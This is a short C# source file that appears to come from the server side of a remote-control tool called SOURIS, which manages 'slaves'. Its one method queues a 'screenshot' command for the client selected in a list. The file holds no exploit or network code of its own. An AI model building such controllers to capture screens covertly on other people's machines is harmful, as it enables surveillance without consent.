using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace SOURIS_Server.Slaves
{
    class SlaveFunc
    {
        public static void Screenshot()
        {
            try
            {
                int selected = MainWindow.main.listView1.SelectedIndex;
                Slaves.SlaveList.List[selected].Nextinteract = "screenshot";
            }
            catch
            {

            }
        }
    }
}
